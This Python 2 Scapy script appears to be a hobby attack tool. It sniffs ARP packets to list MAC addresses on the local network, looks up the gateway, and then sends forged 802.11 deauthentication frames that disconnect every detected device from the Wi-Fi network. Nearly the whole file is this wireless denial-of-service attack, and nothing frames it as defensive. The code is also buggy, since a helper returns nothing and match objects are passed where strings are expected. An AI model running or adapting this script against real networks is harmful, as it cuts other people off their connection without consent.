#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = "Thomas AMORIM"
__credits__ = ["Thomas Amorim", "Pierre-François Bonnefoi" "Scapy"]
__license__ = "MIT"
__version__ = "0.1"
__status__ = "DEV"

from scapy.all import *
import re

list_mac_detected = []
re_ip_gateway = re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")
re_mac = re.compile(r"([\w]{2}):([\w]{2}):([\w]{2}):([\w]{2}):([\w]{2}):([\w]{2})")

def scan_packet(t):
	if not ARP in t:
		return
	if not t[ARP].hwsrc in list_mac_detected:
		mac = t[ARP].hwsrc
		print "New machine on ",mac
		list_mac_detected.append(mac)

def ip_to_mac(ip):
	p = subprocess.Popen(["arp", "-n", ip], stdout=subprocess.PIPE)
	output, err = p.communicate()
	mac = re_mac.search(output)
	print "Mac from ",ip," : ",mac.group(0)

def get_infos():
	pifconfig = subprocess.Popen(["ifconfig", "eth0"], stdout=subprocess.PIPE)
	outputif, errif= pifconfig.communicate()
	mymac = re_mac.search(outputif)
	print "My mac : ",mymac.group(0)
	proute = subprocess.Popen(["ip", "route", "list"], stdout=subprocess.PIPE)
	outputroute, errroute= proute.communicate()
	ip_gateway = re_ip_gateway.search(outputroute)
	print "Gateway IP : ", ip_gateway.group(0)
	return (mymac, ip_to_mac(ip_gateway))

def deauthentification(mac_gateway, mymac):
	for cible in list_mac_detected:
		if not cible == mymac:
			paquet_from_ap = RadioTap()/Dot11(addr1=cible, addr2 = mac_gateway, addr3 = mac_gateway)/Dot11Deauth()
			paquet_from_client = RadioTap()/Dot11(addr1=mac_gateway, addr2 = cible, addr3 = mac_gateway)/Dot11Deauth()
			#paquet_from_ap.show()
			sendp(paquet_from_ap, iface="wlan0")
			sendp(paquet_from_client, iface="wlan0")
			print cible, "expulsed from ", mac_gateway, " !"

def detect_and_destroy(num_max):
	sniff(count=num_max, filter='arp', prn=scan_packet, iface="wlan0")
	mymac, mac_gateway = get_infos()
	deauthentification(mac_gateway, mymac)

if __name__ == "__main__":
	detect_and_destroy(5)